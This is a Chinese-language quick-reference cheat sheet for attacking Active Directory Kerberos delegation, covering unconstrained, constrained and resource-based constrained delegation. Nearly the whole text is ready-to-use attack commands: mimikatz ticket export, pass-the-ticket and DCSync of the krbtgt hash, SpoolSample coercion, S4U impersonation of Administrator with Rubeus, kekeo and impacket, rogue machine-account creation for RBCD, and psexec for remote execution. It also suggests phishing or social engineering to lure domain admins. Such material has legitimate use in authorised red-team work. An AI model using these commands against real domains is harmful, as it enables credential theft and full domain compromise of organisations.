# AD委派攻击速查

## §0 非约束委派（Unconstrained Delegation）

**发现**
```
# ADFind
ADFind -b "DC=domain,DC=com" -f "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" cn distinguishedName

# PowerView
Get-DomainComputer -Unconstrained | select dnshostname,useraccountcontrol

# LDAP过滤器（通用）
(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))
```

**利用**
1. 诱使域管/高权限用户访问已控的非约束委派机器（打印机Bug/社工/钓鱼）
2. 导出内存中的TGT：
```
mimikatz# sekurlsa::tickets /export
```
3. 注入TGT：
```
mimikatz# kerberos::ptt [0;12345]-2-0-40e10000-Administrator@krbtgt-DOMAIN.COM.kirbi
```
4. DCSync收割：
```
mimikatz# lsadump::dcsync /domain:domain.com /user:krbtgt
```

**打印机Bug强制认证**
```
SpoolSample.exe DC01 COMPROMISED-SERVER
# 或 Rubeus监听：
Rubeus.exe monitor /interval:5 /filteruser:DC01$
```

## §1 约束委派（Constrained Delegation）

**发现**
```
# 用户账户
Get-DomainUser -TrustedToAuth | select samaccountname,msds-allowedtodelegateto

# 机器账户
Get-DomainComputer -TrustedToAuth | select dnshostname,msds-allowedtodelegateto

# LDAP
(&(objectCategory=user)(msds-allowedtodelegateto=*))
```

**利用（kekeo）**
```
# 请求TGT
kekeo# tgt::ask /user:svc_sql /domain:domain.com /rc4:HASH

# S4U2Self + S4U2Proxy
kekeo# tgs::s4u /tgt:TGT_svc_sql@DOMAIN.COM.kirbi /user:Administrator /service:cifs/target.domain.com
```

**利用（Rubeus，推荐）**
```
Rubeus.exe s4u /user:svc_sql /rc4:HASH /impersonateuser:administrator /msdsspn:cifs/target.domain.com /ptt
```

**利用（impacket）**
```
getST.py -spn cifs/target.domain.com -impersonate administrator domain.com/svc_sql -hashes :HASH
export KRB5CCNAME=administrator.ccache
psexec.py -k -no-pass target.domain.com
```

**SPN替代**：约束委派的SPN仅校验主机名，可替换服务类型（cifs→ldap→http），同主机不同服务通杀

## §2 基于资源的约束委派（RBCD）

**前置条件**
- 能修改目标机器的 `msDS-AllowedToActOnBehalfOfOtherIdentity`
- 控制一个机器账户（或能创建）

谁能修改该属性：加域用户（查mSDS-CreatorSID）、Account Operator组、机器账户自身

**Step 1：创建机器账户**
```
# impacket
addcomputer.py domain.com/user:pass -computer-name FAKEPC$ -computer-pass P@ss1234

# PowerMad
New-MachineAccount -MachineAccount FAKEPC -Password $(ConvertTo-SecureString 'P@ss1234' -AsPlainText -Force)
```

**Step 2：设置委派**
```
# PowerShell AD模块
Set-ADComputer -Identity target -PrincipalsAllowedToDelegateToAccount FAKEPC$

# PowerView（无AD模块时）
$sid = Get-DomainComputer FAKEPC -Properties objectsid | select -Expand objectsid
$sd = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$sid)"
$bytes = New-Object byte[] ($sd.BinaryLength); $sd.GetBinaryForm($bytes, 0)
Set-DomainObject target -Set @{'msds-allowedtoactonbehalfofotheridentity'=$bytes}
```

**Step 3：获取票据并利用**
```
# 先算NTLM hash: python -c "import hashlib;print(hashlib.new('md4',b'P@ss1234'.decode().encode('utf-16le'),usedforsecurity=False).hexdigest())"
getST.py -spn cifs/target.domain.com -impersonate administrator domain.com/FAKEPC$:'P@ss1234'

export KRB5CCNAME=administrator.ccache
psexec.py -k -no-pass target.domain.com
```

**查找可攻击目标（谁的CreatorSID是我们控制的用户）**
```
Get-DomainComputer | Get-DomainObjectAcl -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match 'GenericAll|GenericWrite|WriteDacl|WriteProperty'}
```
